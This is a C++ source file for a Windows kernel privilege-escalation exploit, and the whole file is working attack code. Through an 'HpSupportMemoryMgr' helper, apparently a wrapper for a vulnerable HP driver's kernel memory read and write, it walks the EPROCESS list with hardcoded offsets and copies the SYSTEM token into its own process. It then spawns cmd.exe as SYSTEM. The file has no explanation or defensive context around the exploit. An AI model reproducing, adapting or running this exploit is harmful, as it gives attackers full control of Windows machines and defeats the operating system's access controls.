#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <intrin.h>
#include "HpSupportMemoryMgr.h"	
#pragma comment(lib, "ntdll")

#define OFFSET_EPROCESS_LINKS 0x448
#define OFFSET_EPROCESS_TOKEN 0x4b8
#define OFFSET_EPROCESS_PID 0x440
#define SYS_INFO_CLASS_MODULE_INFO 0x0b

typedef struct SYSTEM_MODULE {
	PVOID  Reserved1;
	PVOID  Reserved2;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

UINT64 FindNtosBase()
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}


BOOL SearchEprocessLinksForPid(HpSupportMemoryMgr hm, UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess) {
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + OFFSET_EPROCESS_LINKS;
	UINT64 ListHead = ListIter;
	while (TRUE) {
		puts("Reading list iter");
		printf("ListIter : %llx\n", ListIter);
		bRes = hm.ReadVirtData((ListIter + 0x8), sizeof(ListIter), &ListIter);
		printf("ListIter->Flink : %llx\n", ListIter);
		if (!bRes) {
			return FALSE;
		}

		if (ListIter == ListHead) {
			puts("Process not found in ActiveProcess links!");
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - OFFSET_EPROCESS_LINKS;
		UINT64 IterPid = 0;

		bRes = hm.ReadVirtData((IterEprocessBase + OFFSET_EPROCESS_PID), sizeof(IterPid), &IterPid);
		if (!bRes) {
			return FALSE;
		}

		
		if (IterPid == Pid) {
			printf("Found target EPROCESS : %llx - PID %llx\n", IterEprocessBase, IterPid);
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 GetPsInitialSystemProc(UINT64 lpNtoskrnlBase) {
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)lpNtoskrnlBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

int main() {
	HpSupportMemoryMgr hpmm = HpSupportMemoryMgr();
	BOOL bInit = hpmm.init();
	if (!bInit) {
		printf("Failed to init - %lx\n", GetLastError());
		return -1;
	}
	UINT64 NtosBase = FindNtosBase();
	UINT64 OurProcess = 0;
	UINT64 PsInitialSystemProcPtr = GetPsInitialSystemProc(NtosBase);
	printf("Found initial system process at %llx\n", PsInitialSystemProcPtr);
	UINT64 SystemProc = 0;
	hpmm.ReadVirtData(PsInitialSystemProcPtr, sizeof(PsInitialSystemProcPtr), &SystemProc);
	SearchEprocessLinksForPid(hpmm, GetCurrentProcessId(), SystemProc, &OurProcess);
	UINT64 SystemToken = 0;

	puts("Copying system token to our process");

	hpmm.ReadVirtData(SystemProc + OFFSET_EPROCESS_TOKEN, sizeof(SystemToken), &SystemToken);
	hpmm.WriteVirtData(OurProcess + OFFSET_EPROCESS_TOKEN, sizeof(SystemToken), &SystemToken);

	// let's all love lain
	system("C:\\Windows\\System32\\cmd.exe");

}